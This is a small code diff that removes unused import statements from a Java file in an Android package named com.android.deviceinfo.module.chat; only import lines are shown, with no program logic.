@@ -3,20 +3,14 @@ package com.android.deviceinfo.module.chat;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.Hashtable;
 import java.util.List;
 import java.util.concurrent.Semaphore;
 
-import android.content.ContentValues;
 import android.database.Cursor;
-import android.database.DatabaseUtils;
-import android.database.sqlite.SQLiteDatabase;
 
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
-import com.android.deviceinfo.db.RecordGroupsVisitor;
 import com.android.deviceinfo.db.RecordHashPairVisitor;
-import com.android.deviceinfo.db.RecordHashtableListVisitor;
 import com.android.deviceinfo.db.RecordStringVisitor;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
